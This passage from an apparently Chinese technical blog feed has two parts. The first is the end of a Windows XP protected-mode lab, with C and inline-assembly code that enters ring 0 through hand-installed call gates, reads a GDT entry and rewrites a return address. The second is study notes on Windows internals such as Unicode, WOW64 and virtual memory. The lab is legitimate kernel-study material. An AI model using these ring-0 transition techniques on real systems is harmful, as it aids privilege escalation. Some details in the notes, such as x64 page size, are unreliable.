<li>构造2个函数，提权后将第一个函数的返回地址改为第二个函数的入口地址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">		mov eax,<span class="number">0x8003f008</span></span><br><span class="line">		mov eax,[eax]</span><br><span class="line">		mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 修改返回地址，跳转到Exit函数执行</span></span><br><span class="line">		mov eax,<span class="number">0x00401050</span></span><br><span class="line">		mov [esp+<span class="number">0x24</span>],eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line"></span><br><span class="line">		retf	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bye!\n&quot;</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>,dwHigh2GValue);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>如下图，第二个函数的入口地址是<code>0x00401050</code>，代码中修改如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/9NlYEd3HsVqTSmZ.png" alt="46.png"></p>
</li>
<li><p>根据第一个函数的入口地址构造调用门段描述符，0040EC00&#96;00081030</p>
<p><img data-src="https://s2.loli.net/2021/12/18/9NEHiy38vFkeAMt.png" alt="45.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/FaCpr3liQUGonD6.png" alt="47.png"></p>
</li>
<li><p>执行结果如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/18/hc16UkKdFy4zN59.png" alt="48.png"></p>
</li>
</ol>
<h3 id="6-2-双调用门"><a href="#6-2-双调用门" class="headerlink" title="6.2 双调用门"></a>6.2 双调用门</h3><p>题目：通过调用门提权后，在第一个函数中再使用一个调用门去执行第二个函数。</p>
<p><strong>注意：</strong>这里使用了2个调用门段描述符，第1个调用门段描述符的DPL&#x3D;0x11，<strong>第2个调用门段描述符的DPL&#x3D;0x00</strong>。因为第一个函数去调用第二个函数是在0环权限下，所以第二个调用门的DPL&#x3D;0x00。</p>
<p>步骤：</p>
<ol>
<li><p>构造2个函数，提权后进入第一个函数，在第一个函数中再使用调用门去执行第二个函数。</p>
<p>第一个函数执行成功时，设置bFlag_1&#x3D;1。</p>
<p>第二个函数执行成功时，设置bFlag_2&#x3D;1。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue;</span><br><span class="line">BYTE bFlag_1 = <span class="number">0</span>;</span><br><span class="line">BYTE bFlag_2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> Gate_1[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	<span class="comment">//CS_1:8003f048 0040EC00`00081030</span></span><br><span class="line"><span class="keyword">char</span> Gate_2[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x90</span>,<span class="number">0</span>&#125;;	<span class="comment">//CS_2:P=1,DPL=0x00,S=0,0x1000=8,调用门Type=0x1100=C</span></span><br><span class="line">                                  	<span class="comment">//另一个门的CS的位置8003f090</span></span><br><span class="line">                                  	<span class="comment">//CS_2:8003f090 00408C00`00081060</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL_1()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3  注意这里的断点在调试时可以用，但是在真正运行时不能</span></span><br><span class="line">		<span class="comment">//写到函数里，不然会导致程序崩溃</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">		mov eax,<span class="number">0x8003f008</span></span><br><span class="line">		mov eax,[eax]</span><br><span class="line">		mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 修改返回地址，跳转到Exit函数执行</span></span><br><span class="line">		<span class="comment">//mov eax,0x401060</span></span><br><span class="line">		<span class="comment">//mov [esp+0x24],eax</span></span><br><span class="line">		test eax,eax</span><br><span class="line">		mov al,<span class="number">0x1</span></span><br><span class="line">		mov bFlag_1,al	<span class="comment">//mov byte ptr ds:[bFlag_1],al</span></span><br><span class="line"></span><br><span class="line">		call fword ptr ds:[Gate_2]</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line"></span><br><span class="line">		retf	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL_2()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3  注意这里的断点在调试时可以用，但是在真正运行时不能</span></span><br><span class="line">		<span class="comment">//写到函数里，不然会导致程序崩溃</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		test eax,eax</span><br><span class="line">		mov al,<span class="number">0x1</span></span><br><span class="line">		mov bFlag_2,al	<span class="comment">//mov byte ptr ds:[bFlag_2],al </span></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line"></span><br><span class="line">		retf	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr ds:[Gate_1] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x\nGate_1:%x,Gate_2:%x\n&quot;</span>,dwHigh2GValue,bFlag_1,bFlag_2);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取两个函数的入口地址准备构造两个调用门的段描述符。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/hzAY17tUIsDqKJd.png" alt="49.png"></p>
</li>
<li><p>构造2个调用门的段描述符，第一个放在一个P&#x3D;0的0x8003F048。第二个放在P&#x3D;0的0x8003F090，如下图。</p>
<p>eq 8003F048 0040EC00&#96;00081030</p>
<p>eq 8003F090 00408C00&#96;00081060（DPL&#x3D;0x00）</p>
<p><img data-src="https://s2.loli.net/2021/12/18/JSiBCfjMYUPTRWz.png" alt="50.png"></p>
</li>
<li><p>回到XP的VC6中F9取消断点后F5执行，结果如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/D4wXRgvOMIfeJ89.png" alt="51.png"></p>
</li>
</ol>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>《加密与解密》_1_基础知识</title>
    <url>/post/encryption-and-cracking-1-basic/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-文本字符"><a href="#1-文本字符" class="headerlink" title="1 文本字符"></a>1 文本字符</h2><h3 id="1-1-ASCII和Unicode字符集"><a href="#1-1-ASCII和Unicode字符集" class="headerlink" title="1.1 ASCII和Unicode字符集"></a>1.1 ASCII和Unicode字符集</h3><ul>
<li><strong>ASCII</strong>：<mark class="label success">单字节</mark>编码（最高位没有使用，实际上是7位编码标准），编码取值范围为<mark class="label info">00h~7Fh</mark>，包含26个小写字母、26个大写字母、10个数字、33个控制代码及空格，共128个字符。 （不同的计算机厂商对ASCII进行了扩充使其变为8位，取值范围为<code>00h~FFh</code>）</li>
<li><strong>Unicode</strong>：<mark class="label success">双字节</mark>编码，编码取值范围为<mark class="label info">0000h~FFFFh</mark>，使用<code>0~65535</code>无符号（正整数）的整数对每个字符进行编码。</li>
</ul>
<p><img data-src="https://i.loli.net/2021/06/28/u2OMC7nApEyTFrZ.png" alt="1.png"></p>
<h3 id="1-2-字节存储顺序"><a href="#1-2-字节存储顺序" class="headerlink" title="1.2 字节存储顺序"></a>1.2 字节存储顺序</h3><div class="note warning"><p><strong>大端序</strong>：Big-endian，字符高字节存入存储器低地址，低字节存入高地址。</p>
<p><strong>小端序</strong>：Little-endian，字符高字节存入存储器高地址，低字节存入低地址。</p>
</div>

<p>Intel处理器使用<strong>小端序</strong>在内存中将一个字存入相邻的2字节存储器空间中去。</p>
<p>如将<code>pediy</code>存入到内存中，Unicode为：<code>0070 0065 0064 0069 0079</code>：</p>
<p><img data-src="https://i.loli.net/2021/06/28/XEBnQq5kjosMexL.png" alt="2.png"></p>
<p><img data-src="https://i.loli.net/2021/06/28/PhAswXb1RzBaYHy.png" alt="3.png"></p>
<p><img data-src="https://i.loli.net/2021/06/28/HaiO8yfXGVoBZpw.png" alt="4.png"></p>
<div class="note primary"><ul>
<li>一般来说，x86系列CPU都是Little-endian 字节序；</li>
<li>PowerPC 通常是Big-endian字节序。</li>
<li>因为网络协议也都是采用Big-endian方式传输数据的，所以有时也把 Big-endian方式称为网络字节序。</li>
</ul>
</div>



<h2 id="2-Windows操作系统"><a href="#2-Windows操作系统" class="headerlink" title="2 Windows操作系统"></a>2 Windows操作系统</h2><h3 id="2-1-Win32-API函数"><a href="#2-1-Win32-API函数" class="headerlink" title="2.1 Win32 API函数"></a>2.1 Win32 API函数</h3><div class="note info"><ul>
<li>用于16位Windows的API（Windows 1.0~Windows3.1）称作“Win16”；</li>
<li>用于32位Windows的 API（Windows 9x&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;7&#x2F;10）称作“Win32” ；</li>
<li>64位Windows API的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。</li>
</ul>
</div>

<p>API 函数调用在从Win16到Win32的转变中保持兼容，并在数量和功能上不断增强。W indows 1.0只支持不到450个函数调用，现在已有几千个函数了。</p>
<div class="note danger"><p><strong>所有32位Windows都支持Win16 API（以确保与旧的应用程序兼容）和Win32 API（以运行新的应用程序）</strong>。</p>
</div>

<p>非常有趣的是，Windows NT&#x2F;2000&#x2F;XP&#x2F;7与Windows 9x 的工作方式不同。在Windows NT&#x2F;2000&#x2F;XP&#x2F;7中，Win16 函数调用通过一个转换层转换为Win32函数调用，然后被操作系统处理。 在Windows 9x中，该操作正好相反，Win32 函数调用通过转换层转换为Win16函数调用，再由操作系统进行处理。</p>
<p>Windows运转的核心是动态链接。Windows 提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（DLL）实现。在Windows 9x中，DLL 通常位于<code>\WINDOWS\SYSTEM</code>子目录中。 在Windows NT&#x2F;2000&#x2F;XP&#x2F;7中，DLL通常位于系统安装目录的<code>\SYSTEM</code>和<code>\SYSTEM32</code>子目录中。</p>
<div class="note warning"><p> 在早期， Windows的主要部分只需要在3个动态链接库中实现，它们分别代表Windows的3个主要子系统，叫作Kernel、User和GDI。</p>
<ol>
<li><strong>Kernel</strong>（由KERNEL32.DLL实现）：操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等。</li>
<li><strong>User</strong>（由USER32.DLL实现）：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等。</li>
<li><strong>GDI</strong> （由GDI32.DLL实现）：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。</li>
</ol>
</div>



<mark class="label primary">MessageBoxA</mark><mark class="label warning">MessageBoxW</mark>

<p>在Win32 API 函数字符集中，<mark class="label primary">A</mark>表示ANSI（ASCII的扩展，8bit编码）， <mark class="label warning">W</mark>表示Widechars（即Unicode）。前者就是通常使用的单字节方式，后者是宽字节方式，以便处理双字节字符。每个以字符串为参数的Win32函数在操作系统中都有这两种方式的版本。</p>
<p>例如，在编程时使用MessageBox函数，而在USER32.DLL 中却没有32位MessageBox函数的入口。实际上有两个入口，一个名为<code>MessageBoxA</code>（ANSI版）， 另一个名为<code>MessageBoxW</code>（宽字符版）。幸运的是，程序员通常不必关心这个问题，只需要在编程时使用MessageBox 函数，开发工具的编译模块就会根据设置来决定是采用MessageBoxA 还是 MessageBoxW了。<strong>但是在使用OD调试的时候得区分开。</strong></p>
<div class="note info"><p>NT系统是使用 Unicode 标准字符集重新开发的，其系统核心完全是用Unieode函数工作的。如果希望调用一个 Windows函数并向它传递一个 ANSI字符串，系统会先将ANSI字符串转换成Unicode字符串，再将Unicode字符串传递给操作系统。相反，如果希望函数返回ANSI字符串，系统会先将Unicode字符串转换成ANSI 字符串，然后将结果返回应用程序。也就是说，在NT架构下，Win32 API能接受Unicode和ASCII两种字符集，而其<mark class="label info">内核只能使用Unicode字符集</mark>。尽管这些操作对用户来说都是透明的，但字符串的转换需要占用系统资源。</p>
</div>

<h3 id="2-2-WOW64"><a href="#2-2-WOW64" class="headerlink" title="2.2 WOW64"></a>2.2 WOW64</h3><p>WOW64（Windows-on-Windows 64-bit）是64位Windows操作系统的子系统，可以使大多数32位应用程序在不进行修改的情况下运行在64位操作系统上。</p>
<p><strong>64位的Windows，除了带有64位操作系统应有的系统文件，还带有32位操作系统应有的系统文件。</strong></p>
<ul>
<li><p>Windows的64位系统文件都放在一个叫作<code>System32</code>的文件夹中，<code>\Windows\System32</code>文件夹中包含原生的64位映像文件。为了兼容32位操作系统，还增加了<code>\Windows\SysWOW64</code>文件夹，其中存储了32位的系统文件。</p>
</li>
<li><p>64位应用程序会加载<code>System32</code>目录下64位的<code>kernel32.dll</code>、<code>user32.dll</code>和<code>ntdll.dll</code>。</p>
</li>
<li><p>当32位应用程序加载时，<mark class="label success">WOW64</mark><mark class="label danger">建立32位ntdll.dll所要求的启动环境，将CPU模式切换至32位，并开始执行32位加载器</mark>，就如同该进程运行在原生的32位系统上一样。 </p>
</li>
<li><p>WOW64会对32位<code>ntdll.dll</code>的调用重定向<code>ntdll.dll</code>（64位），而不是发出原生的32位系统调用指令。WOW64转换到原生的64位模式，捕获与系统调用有关的参数，发出对应的原生64位系统调用。当原生的系统调用返回时，WOW64在返回32位模式之前将所有输出参数从64位转换成32位。</p>
</li>
<li><p>WOW64既不支持16位应用程序的执行（32位Windows支持16 位应用程序的执行），也不支持加载32位内核模式的设备驱动程序。<strong>WOW64进程只能加载32位的DLL，不能加载原生的64位DLL</strong>。类似的，<strong>原生的64位进程不能加载32位的DLL</strong>。</p>
</li>
</ul>
<h3 id="2-3-虚拟内存"><a href="#2-3-虚拟内存" class="headerlink" title="2.3 虚拟内存"></a>2.3 虚拟内存</h3><p>CPU的运行模式：实模式、保护模式、虚拟8086模式。<a href="https://blog.csdn.net/laviolette/article/details/51658650">实模式和保护模式</a></p>
<p>X86机器主要使用实模式和保护模式：</p>
<ul>
<li><p>实模式：<strong>16位的操作系统，应用程序直接使用物理内存，无虚拟内存的概念</strong>。内存并没有分段，段的划分来自于CPU，由于8086CPU用$段地址*16+偏移地址&#x3D;物理地址$的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存物理地址，寻址使用段寄存器：</p>
<ul>
<li><p>CS：代码段寄存器；</p>
</li>
<li><p>DS：数据段寄存器；</p>
</li>
<li><p>SS：堆栈段寄存器；</p>
</li>
<li><p>ES：扩展段寄存器；</p>
</li>
<li><p>IP：指令指针寄存器。</p>
<p>当CPU要访问内存时，有这四个段寄存器提供内存单元的段地址CS和IP是CPU中最关键的寄存器，他们指示了CPU当前要读取指令的地址。在任何时候 CPU将CS、IP中的内容当做指令的段地址和偏移地址，用他们合成指令的物理地址到内存中读取指令码。$物理地址&#x3D;CS*16+IP$</p>
</li>
</ul>
</li>
<li><p>保护模式：32位系统开始采用的模式，<strong>使用虚拟内存技术</strong>，给每个运行的程序分配逻辑上的4GB虚拟内存（32位和64位进程），使应用程序不直接操作物理内存、各应用程序独立运行互不影响、提高物理内存的使用效率，<strong>CPU使用段页式内存管理</strong>。</p>
</li>
</ul>
<p><strong>虚拟内存：</strong></p>
<ol>
<li>当一个 PE 文件被执行时，操作系统会先为该程序创建一个 4GB 的进程虚拟地址空间，当创建完虚拟地址空间所需要的数据结构后，进程开始读取 PE 文件的第一页。在PE 文件的第一页包含了 PE 文件头和段表等信息，进程根据文件头和段表等信息，将 PE 文件中所有的段一一映射到虚拟地址空间中相应的页（PE 文件中的段的长度都是页长的整数倍）。这时 PE 文件的真正指令和数据还没有被装入内存中，操作系统只是据 PE 文件的头部等信息建立了 PE 文件和进程虚拟地址空间中页的映射关系而已。</li>
<li>当 CPU 要访问程序中用到的某个虚拟地址时，当 CPU 发现该地址并没有相关联的物理地址时， CPU 认为该虚拟地址所在的页面是个空页面， CPU 会认为这是个<mark class="label danger">页错误</mark>（Page Fault）， CPU 也就知道了操作系统还未给该 PE 页面分配内存，CPU 会将控制权交还给操作系统。</li>
<li>操作系统于是为该 PE 页面在物理空间中分配一个页面，然后再将这个物理页面与虚拟空间中的虚拟页面映射起来，然后将控制权再还给进程，进程从刚才发生页错误的位置重新开始执行。由于此时已为 PE 文件的那个页面分配了内存，所以就不会发生页错误了。随着程序的执行，页错误会不断地产生，操作系统也会为进程分配相应的物理页面来满足进程执行的需求。</li>
</ol>
<p>1）程序执行时，PE文件与虚拟地址映射过程如下图（<a href="https://www.cnblogs.com/kekec/p/7350993.html">Windows虚拟内存机制</a>）：</p>
<p><img data-src="https://i.loli.net/2021/07/06/Bogt2S61q4GYvy7.png" alt="6.png"></p>
<p>2）虚拟地址与物理地址的映射如下图（<a href="https://blog.csdn.net/qq_41723615/article/details/102541030">物理地址、虚拟地址、虚拟内存、分段、分页以及Windows&#x2F;Linux内存管理</a>）：</p>
<p><img data-src="https://i.loli.net/2021/07/06/XzfhqEZmsOAB92K.png" alt="7.png"></p>
<p>3）当CPU访问数据时将已经从虚拟地址与物理地址映射好的数据装进物理内存过程如下图（<a href="https://blog.csdn.net/lwwl12/article/details/88859044">Windows API（四）Win32 内存结构</a>）：</p>
<p><img data-src="https://i.loli.net/2021/07/07/d9W5s8ISJLMUGCj.png" alt="8.png"></p>
<div class="note info"><p><strong>段的定义</strong>：把程序与其相关的数据划分到几个段中，比如数据段、代码段和堆栈段。段的长度有限制，但是不要求所有程序的所有段长度都一样。</p>
<p>现代操作系统使用<mark class="label primary">段页式内存管理</mark>，在段页式系统中，程序的地址空间首先被分成若干个逻辑段（.data、.text、.bss、栈、堆等），每段都有自己的段号，然后再将每一段分成若干个大小固定的页。对内存空间的管理仍然和分页存储管理一样，将其分成若干个和页面大小相同的存储块，对内存的分配以存储块为单位。</p>
<p>段，是从编程的角度来看的，比如PE文件的各个分段就是一种划分，每个段的属性可以不同。段的使用方法先于分页，然后到现在使用的段页式内存管理方式。</p>
<p><mark class="label warning">程序（PE文件）载入虚拟内存使用分段方式，MMU将虚拟内存转换为物理内存使用分页方式。PE文件中也是进行分段处理。</mark></p>
<ul>
<li><strong>分段机制</strong>：实现虚拟地址（由段和偏移构成的逻辑地址）到线性地址（<code>0xXXXX XXXX</code>）的转换。</li>
<li><strong>分页机制</strong>：分页管理机制实现线性地址到物理地址的转换。</li>
</ul>
<p><strong>先分段 , 再分页</strong></p>
<p>将进程按逻辑模块分段，再将各段分页（如每个页面 4KB) 再将内存空间分为大小相同的内存块&#x2F;页框&#x2F;页帧&#x2F;物理块进程前将各页面分别装入各内存块中。</p>
</div>

<p>实现线性地址到物理地址的转换这个对应是由MMU硬件实现的，不用程序员操心！而且分页和分段对于虚拟地址的映射方式基本一致，<strong>分段是通过段表GDT，LDT中的段描述符来确定段的属性和物理地址范围；而分页是通过页表项（页表描述符）来记录页框的属性和物理地址位置！</strong></p>
<p>在段页式存储管理系统中，作业的地址空间首先被分成若干个逻辑分段，每段都有自己的段号，然后再将每段分成若干个大小相等的页。对于主存空间也分成大小相等的页，主存的分配以页为单位。</p>
<ul>
<li><a href="https://blog.csdn.net/lianghe_work/article/details/47776447">浅谈进程地址空间与虚拟存储空间</a></li>
<li><a href="https://blog.csdn.net/qq_41723615/article/details/102541030">物理地址、虚拟地址、虚拟内存、分段、分页以及Windows&#x2F;Linux内存管理</a></li>
</ul>
<p>分段和分页的区别：</p>
<ol>
<li>在分段的方法中，<strong>每次程序运行时总是把程序全部装入内存</strong>，而分页的方法则有所不同。分页的思想是程序运行时用到哪页就为哪页分配内存，没用到的页暂时保留在硬盘上。当用到这些页时再在物理地址空间中为这些页分配内存，然后建立虚拟地址空间中的页和刚分配的物理内存页间的映射。</li>
<li>分页仅仅是由于系统管理的需要而不是用户的需要。段则是信息的逻辑单位，它含有一组其意义相对完整的信息。分段的目的是为了能更好地满足用户的需要。</li>
<li>页的大小固定且由系统决定，由系统把逻辑地址划分为页号和页内地址两部分，是由机器硬件实现的，因而在系统中只能有一种大小的页面；而段的长度却不固定，决定于用户所编写的程序，通常由编译程序在对源程序进行编译时，根据信息的性质来划分。</li>
<li>分页的作业地址空间是一维的，即单一的线性地址空间，程序员只需利用一个记忆符，即可表示一个地址；而分段的作业地址空间则是二维的，程序员在标识一个地址时，既需给出段名，又需给出段内地址。</li>
<li>在段式存储管理中，将程序的地址空间划分为若干段（segment），如代码段，数据段，堆栈段；这样每个进程有一个二维地址空间，相互独立，互不干扰。段式管理的优点是：没有内碎片（因为段大小可变，改变段大小来消除内碎片）。但段换入换出时，会产生外碎片（比如4k的段换5k的段，会产生1k的外碎片）。</li>
</ol>
<ul>
<li>【<a href="https://blog.csdn.net/bupt_tinyfisher/article/details/8939689">分段和分页内存管理</a>】</li>
</ul>
<div class="note success"><p><strong>磁盘一个物理扇区的大小为512字节， 即200h（字节），PE文件的区块在磁盘中以这个粒度为大小进行对齐。</strong></p>
<ul>
<li>在x86系列CPU中，内存页是按4KB （<code>1000h</code>）排列的,所以，在x86系统中（虚拟内存），PE文件区块的内存对齐值般为<code>1000h</code>，每个区块从<code>1000h</code>的倍数的内存偏移位置开始。（4(KB)*1024&#x3D;4096 Byte&#x3D;1000h Byte）</li>
<li>在x64中， 内存页是按8KB（<code>2000h</code>）排列的。</li>
</ul>
</div>



<p>32位处理器将分配给每个应用程秀的虚拟地址空间做如下划分，一般给用户模式划分2GB虚拟内存，也可扩大3GB。无论是32位还是64位windows若要让32位程序能使用3GB内存，必须在链接时加上参数：<a href="https://blog.csdn.net/lff0305/article/details/7613741"><code> /LARGEADDRESSAWARE</code></a>、<a href="https://blog.csdn.net/u011430225/article/details/88950730?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">32位Exe程序突破系统内存限制</a></p>
<p>在早期版本的Windows中，Microsoft不允许用户程序访问2GB以上的地址空间，为了让此类应用程序即使在用模式分区大于2GB的环境下仍能正常运行，Microsoft提供代了一种模式来增大用户模式分区，最多不超过3GB。 当前系统即将运行一个应用程序时，它会检查应用程序在链接时是否使用了<code>/LARGEADDRESSAWARE</code>链接器开关。如果是，则相应于应用程序在声明它会充分利用大用户模式地址空间，而不会对内在地址进行任何不当的操作。反之，如果应用程序在链接时没有使用<code>/LARGEADDRESSAWARE</code>开关，那么操作系统会保留用户模式分区中2GB以上到内核模式开始处的整个部分。</p>
<p>本文以默认情况2GB用户模式为例。</p>
<p><img data-src="https://i.loli.net/2021/07/05/uBxb4zF1cJ6Dryj.png" alt="5.png"></p>
<div class="note default"><ol>
<li><strong>64KB NULL指针区</strong> （<code>0x00000000~0x0000FFFF</code>）: 如果进程中的一个线程试图操作这个分区中的数据，CPU就会引发非法访问。他的作用是，调用<code>malloc</code>等内存分配函数时，如果无法找到足够的内存空间，它将返回<code>NULL</code>。而不进行安全性检查。它只是假设地址分配成功，并开始访问内存地址<code>0x00000000</code>（NULL）。由于禁止访问内存的这个分区，因此会发生非法访问现象，并终止这个进程的运行。没有任何办法可以让我们分配到位于这一地址空间的虚拟内存，即使是使用Win32 API也不例外。</li>
<li><strong>用户模式分区</strong> ( <code>0x00010000~0xBFFEFFFF</code>)：这个分区中存放进程的私有地址空间，DLL被装入这一分区，内存映射文件映射到该分区。一个进程无法以任何方式访问另外一个进程驻留在这个分区中的数据 （相同 exe，通过 copy-on-write 来完成地址隔离）。（在Windows中，<mark class="label warning">所有 .exe 和动态链接库都载入到这一区域</mark>。<strong>系统同时会把该进程可以访问的所有内存映射文件（系统DLL）映射到这一分区</strong>，对所有应用程序来说，进程的大部分数据都保存在这一分区。）。</li>
<li><strong>64KB 禁入区</strong> (<code>0xBFFF0000~0xBFFFFFFF</code>)：这个分区禁止进入，禁止访问分区只有在Win2000中有。这个分区是用户分区和内核分区之间的一个隔离带，目的是为了防止用户程序违规访问内核分区。任何试图访问这个内存分区的操作都是违规的。微软保留这块分区的目的是为了简化操作系统的现实。</li>
<li><strong>内核区</strong> (0xC0000000~0xFFFFFFFF)：装入Windows NT执行体、内核和设备驱动。这个分区存放操作系统驻留的代码、内核对象也驻留在此。线程调度、内存管理、文件系统支持、网络支持和所有设备驱动程序代码都在这个分区加载。内核分区对用户的程序来说是禁止访问的，操作系统的代码在此。内核对象也驻留在此。<mark class="label warning">这个分区被所有进程共享</mark>。</li>
</ol>
</div>

<p>给每个应用程序分配4GB虚拟内存（如上图），但是只有用户模式的2&#x2F;3GB可以被应用程序直接使用，各个应用程序的用户区都是隔离的，逻辑上的，虚拟的。但是内核区的1&#x2F;2GB，内核区保存的是系统线程调度、内存管理、设备驱动等数据，这部分数据供<strong>所有的进程</strong>共享，但应用程序是不能直接访问的。</p>
<div class="note primary"><p>Windows系统在进程空间中专门划出一块<code>0x7000 0000 - 0x8000 0000</code>（共256MB）区域，用于映射这些常用的系统DLL(如kernel32.dll、ntdll.dll等)</p>
</div>

<p>2GB用户模式分区：</p>
<p><img data-src="https://i.loli.net/2021/07/09/lrAfWe6vSmM7wRz.png" alt="10.png"></p>
<p>参考：</p>
<ul>
<li><p>32位：【<a href="https://blog.csdn.net/muyangjun/article/details/83795640">Windows 内存机制说明</a>】、【<a href="https://www.cnblogs.com/kekec/p/7350993.html">windows虚拟内存机制</a>】、【<a href="https://blog.csdn.net/lianghe_work/article/details/47776447">浅谈进程地址空间与虚拟存储空间</a>】、【<a href="https://blog.csdn.net/zhanxiao5287/article/details/83902332">内存、虚拟内存的布局</a>】</p>
</li>
<li><p>64位：【<a href="https://www.cnblogs.com/xuanyuan/p/5260871.html">64 位 Windows 内核虚拟地址空间布局（基于 X64 CPU）</a>】</p>
</li>
<li><p>Win98和Win2000虚拟内存分区的区别：【<a href="https://www.cnblogs.com/gd-luojialin/p/7591274.html">进程的虚拟地址空间</a>】</p>
</li>
